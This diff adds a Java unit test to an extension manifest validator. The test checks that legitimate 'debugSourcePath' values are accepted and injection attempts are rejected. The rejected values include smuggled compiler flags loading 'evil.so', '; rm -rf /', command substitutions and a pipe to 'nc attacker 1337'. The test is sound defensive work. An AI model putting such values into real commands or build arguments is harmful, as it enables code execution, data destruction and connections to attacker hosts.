@@ -214,6 +214,68 @@ public class ExtensionManifestValidatorTest {
     }
 
     @Test
+    public void testValidateAppManifestContextDebugSourcePath() throws ExtenderException {
+        List<String> empty = new ArrayList<>();
+        ExtensionManifestValidator validator = new ExtensionManifestValidator(new WhitelistConfig(), empty, empty);
+
+        // Null context and empty / missing debugSourcePath are accepted
+        assertDoesNotThrow(() -> validator.validateAppManifestContext(null));
+        assertDoesNotThrow(() -> validator.validateAppManifestContext(new HashMap<>()));
+        assertDoesNotThrow(() -> {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("debugSourcePath", "");
+            validator.validateAppManifestContext(ctx);
+        });
+
+        // Legitimate paths
+        String[] good = new String[] {
+                "/tmp/build",
+                "src",
+                "./src",
+                "build/intermediate-1.2_x",
+                "/Users/me/project/src",
+        };
+        for (String s : good) {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("debugSourcePath", s);
+            assertDoesNotThrow(() -> validator.validateAppManifestContext(ctx),
+                    "expected to accept debugSourcePath: " + s);
+        }
+
+        // PoC + injection variants
+        String[] bad = new String[] {
+                "/tmp -Xclang -load /etc/libs/evil.so",
+                "/tmp -fplugin=/etc/libs/evil.so",
+                "/tmp\t-I/etc",
+                "/tmp\n-I/etc",
+                "/tmp;rm -rf /",
+                "/tmp$(whoami)",
+                "/tmp`id`",
+                "/tmp|nc attacker 1337",
+                "/tmp\"quoted\"",
+                "/tmp\\backslash",
+                "with space",
+        };
+        for (String s : bad) {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("debugSourcePath", s);
+            ExtenderException exc = assertThrows(ExtenderException.class,
+                    () -> validator.validateAppManifestContext(ctx),
+                    "expected rejection of debugSourcePath: " + s);
+            assertTrue(exc.getMessage().contains("debugSourcePath"),
+                    "message should mention debugSourcePath, got: " + exc.getMessage());
+        }
+
+        // Wrong type is rejected
+        {
+            Map<String, Object> ctx = new HashMap<>();
+            ctx.put("debugSourcePath", 42);
+            assertThrows(ExtenderException.class,
+                    () -> validator.validateAppManifestContext(ctx));
+        }
+    }
+
+    @Test
     public void testValidateSymbols() throws ExtenderException {
         List<String> empty = new ArrayList<>();
         ExtensionManifestValidator validator = new ExtensionManifestValidator(new WhitelistConfig(), empty, empty);
